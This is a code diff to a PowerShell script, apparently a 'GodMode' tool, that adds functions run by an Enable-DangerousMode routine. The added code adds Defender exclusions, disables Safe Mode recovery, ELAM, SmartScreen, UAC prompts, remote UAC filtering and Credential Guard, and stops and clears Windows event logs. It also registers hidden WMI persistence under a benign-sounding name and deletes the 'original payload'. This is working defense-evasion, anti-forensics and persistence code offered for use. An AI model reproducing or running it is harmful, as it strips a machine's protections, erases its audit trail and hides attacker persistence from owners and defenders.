@@ -1187,6 +1187,136 @@ function Test-BuiltInAdmin {
     return ($sid -like "*-500")
 }
 
+# --- Helper: Add Defender Exclusion ---
+function Add-DefenderExclusion {
+    param([string]$Path)
+    try {
+        Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
+        Write-Log -Message "Defender exclusion added: $Path" -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to add Defender exclusion for $Path`: $_" -Type "WARN" -Color Yellow }
+}
+
+# --- Helper: Disable Safe Mode / Recovery ---
+function Disable-RecoveryAndSafeMode {
+    try {
+        bcdedit /set {current} safeboot minimal /f 2>$null | Out-Null
+        bcdedit /set {current} bootstatuspolicy ignoreallfailures /f 2>$null | Out-Null
+        bcdedit /set {current} recoveryenabled No /f 2>$null | Out-Null
+        bcdedit /set {current} nx AlwaysOff /f 2>$null | Out-Null
+        reagentc /disable 2>$null | Out-Null
+        Write-Log -Message "Safe Mode and Recovery disabled." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "BCD edit failed: $_" -Type "WARN" -Color Yellow }
+}
+
+# --- Helper: Suppress Security Center Alerts ---
+function Disable-SecurityAlerts {
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAHealth" -Value 1 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Security Center alerts suppressed." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to suppress security alerts: $_" -Type "WARN" -Color Yellow }
+}
+
+# --- Helper: Disable Early Launch Anti-Malware ---
+function Disable-ELAM {
+    try {
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -Value 3 -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "ELAM boot driver policy disabled." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to disable ELAM: $_" -Type "WARN" -Color Yellow }
+}
+
+# --- Helper: Disable Security Auditing / Clear Logs ---
+function Disable-SecurityAuditing {
+    try {
+        Stop-Service -Name "EventLog" -Force -ErrorAction SilentlyContinue
+        Set-Service -Name "EventLog" -StartupType Disabled -ErrorAction SilentlyContinue
+        Stop-Service -Name "CryptSvc" -Force -ErrorAction SilentlyContinue
+        Set-Service -Name "CryptSvc" -StartupType Disabled -ErrorAction SilentlyContinue
+        wevtutil el | ForEach-Object { wevtutil cl "$_" 2>$null | Out-Null }
+        Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger" -ErrorAction SilentlyContinue | ForEach-Object {
+            Set-ItemProperty -Path $_.PSPath -Name "Start" -Value 0 -Force -ErrorAction SilentlyContinue
+        }
+        Write-Log -Message "Security auditing disabled and event logs cleared." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to disable security auditing: $_" -Type "WARN" -Color Yellow }
+}
+
+# --- Helper: WMI File-less Persistence ---
+function Register-GodModeWMI {
+    try {
+        $WmiName = "Win32ProviderHealthCheck"
+        $FilterPath = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
+            Name = $WmiName
+            EventNamespace = "root\cimv2"
+            QueryLanguage = "WQL"
+            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Service'"
+        } -ErrorAction SilentlyContinue
+        $ConsumerPath = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
+            Name = $WmiName
+            CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
+        } -ErrorAction SilentlyContinue
+        if ($FilterPath -and $ConsumerPath) {
+            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
+                Filter = $FilterPath
+                Consumer = $ConsumerPath
+            } -ErrorAction SilentlyContinue
+        }
+        Write-Log -Message "WMI persistence registered." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "WMI registration failed: $_" -Type "WARN" -Color Yellow }
+}
+
+# --- Helper: Self-Destruct Original Payload ---
+function Invoke-SelfDestruct {
+    param([string]$Path)
+    try {
+        if (Test-Path $Path) {
+            Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
+            Write-Log -Message "Original payload self-destructed: $Path" -Type "INFO" -Color Gray
+        }
+    } catch { Write-Log -Message "Self-destruct failed: $_" -Type "WARN" -Color Yellow }
+}
+
+# --- NEW: Registry Power Functions ---
+function Disable-UACPrompts {
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "UAC prompts disabled (silent elevation)." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to disable UAC prompts: $_" -Type "WARN" -Color Yellow }
+}
+
+function Disable-SmartScreenRegistry {
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" -Name "EnabledV9" -Value 0 -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "SmartScreen disabled via registry." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to disable SmartScreen registry: $_" -Type "WARN" -Color Yellow }
+}
+
+function Disable-RemoteUAC {
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Remote UAC disabled (full admin tokens over network)." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to disable Remote UAC: $_" -Type "WARN" -Color Yellow }
+}
+
+function Disable-CredentialGuard {
+    try {
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 0 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequirePlatformSecurityFeatures" -Value 0 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -Value 0 -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Credential Guard / VBS disabled via registry." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to disable Credential Guard: $_" -Type "WARN" -Color Yellow }
+}
+
+function Disable-WindowsScriptHost {
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Windows Script Host disabled via registry." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to disable WSH: $_" -Type "WARN" -Color Yellow }
+}
+
 function Enable-DangerousMode {
     Write-Log -Message "Enabling dangerous mode..." -Type "WARN" -Color Yellow
 
@@ -1270,6 +1400,21 @@ function Enable-DangerousMode {
 
     # 8. Disable event logging and clear tracks
     Disable-SecurityAuditing
+
+    # 9. NEW: Disable UAC prompts (silent elevation)
+    Disable-UACPrompts
+
+    # 10. NEW: Disable SmartScreen via registry
+    Disable-SmartScreenRegistry
+
+    # 11. NEW: Disable Remote UAC (full admin tokens over network)
+    Disable-RemoteUAC
+
+    # 12. NEW: Disable Credential Guard / VBS
+    Disable-CredentialGuard
+
+    # 13. NEW: Disable Windows Script Host
+    Disable-WindowsScriptHost
 }
 
 function Disable-DangerousMode {
@@ -1351,6 +1496,36 @@ function Disable-DangerousMode {
     try {
         Set-Service -Name "EventLog" -StartupType Automatic -ErrorAction SilentlyContinue
         Start-Service -Name "EventLog" -ErrorAction SilentlyContinue
+    } catch {}
+
+    # 12. NEW: Restore UAC prompts
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 5 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 1 -Force -ErrorAction SilentlyContinue
+    } catch {}
+
+    # 13. NEW: Restore SmartScreen
+    try {
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" -Name "EnabledV9" -ErrorAction SilentlyContinue
+    } catch {}
+
+    # 14. NEW: Restore Remote UAC
+    try {
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -ErrorAction SilentlyContinue
+    } catch {}
+
+    # 15. NEW: Restore Credential Guard / VBS
+    try {
+        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequirePlatformSecurityFeatures" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -ErrorAction SilentlyContinue
+    } catch {}
+
+    # 16. NEW: Restore Windows Script Host
+    try {
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -ErrorAction SilentlyContinue
     } catch {}
 
     Write-Log -Message "Dangerous mode disable attempt complete. Reboot strongly recommended for full restoration." -Type "INFO" -Color Yellow
@@ -1706,6 +1881,66 @@ function Show-GodModeStatus {
         }
     } catch {
         Write-Host "  Event Logging           : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    # UAC Prompts
+    try {
+        $UacPrompt = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -ErrorAction SilentlyContinue
+        if ($UacPrompt -and $UacPrompt.ConsentPromptBehaviorAdmin -eq 0) {
+            Write-Host "  UAC Prompts             : SILENT (No Elevation Prompt)" -ForegroundColor Red
+        } else {
+            Write-Host "  UAC Prompts             : PROMPTING" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "  UAC Prompts             : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    # SmartScreen
+    try {
+        $SsReg = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -ErrorAction SilentlyContinue
+        if ($SsReg -and $SsReg.EnableSmartScreen -eq 0) {
+            Write-Host "  SmartScreen             : DISABLED (Registry)" -ForegroundColor Red
+        } else {
+            Write-Host "  SmartScreen             : ENABLED" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "  SmartScreen             : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    # Remote UAC
+    try {
+        $Ruac = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -ErrorAction SilentlyContinue
+        if ($Ruac -and $Ruac.LocalAccountTokenFilterPolicy -eq 1) {
+            Write-Host "  Remote UAC              : DISABLED (Full Admin Tokens)" -ForegroundColor Red
+        } else {
+            Write-Host "  Remote UAC              : ENABLED (Filtered)" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "  Remote UAC              : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    # Credential Guard / VBS
+    try {
+        $Vbs = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue
+        if ($Vbs -and $Vbs.EnableVirtualizationBasedSecurity -eq 0) {
+            Write-Host "  Credential Guard / VBS  : DISABLED" -ForegroundColor Red
+        } else {
+            Write-Host "  Credential Guard / VBS  : ENABLED" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "  Credential Guard / VBS  : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    # Windows Script Host
+    try {
+        $Wsh = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -ErrorAction SilentlyContinue
+        if ($Wsh -and $Wsh.Enabled -eq 0) {
+            Write-Host "  Windows Script Host     : DISABLED" -ForegroundColor Red
+        } else {
+            Write-Host "  Windows Script Host     : ENABLED" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "  Windows Script Host     : UNKNOWN" -ForegroundColor DarkGray
     }
 
     # Defender Exclusions
